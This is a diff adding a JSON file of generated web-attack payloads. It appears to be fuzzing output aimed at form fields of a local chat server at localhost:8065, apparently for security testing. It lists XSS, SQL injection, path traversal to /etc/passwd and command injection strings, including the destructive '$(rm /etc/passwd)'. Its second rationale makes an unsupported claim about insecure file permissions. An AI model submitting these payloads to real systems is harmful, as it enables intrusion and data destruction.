@@ -1,0 +1,39 @@
+{
+    "status": "complete",
+    "generated_targets": 20,
+    "payloads": [
+        {
+            "target": "form field 'unknown' on page 'dashboard' with URL http://localhost:8065/equipo-tesina/channels/town-square and field id 'post_textbox' of type textarea",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l; echo 'Command Injection'",
+                "../../../etc/passwd",
+                "admin' OR 1=1 --"
+            ],
+            "rationale": "Testing for various web vulnerabilities including XSS, SQLi, command injection, path traversal, and auth bypass with short attack strings.",
+            "target_desc": "form field 'unknown' on page 'dashboard'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "action": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'dashboard'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The insecure file permissions and lack of input validation on the file upload field make it vulnerable to various attacks.",
+            "target_desc": "form field 'unknown' on page 'dashboard'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "action": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        }
+      ]  
+
+ }
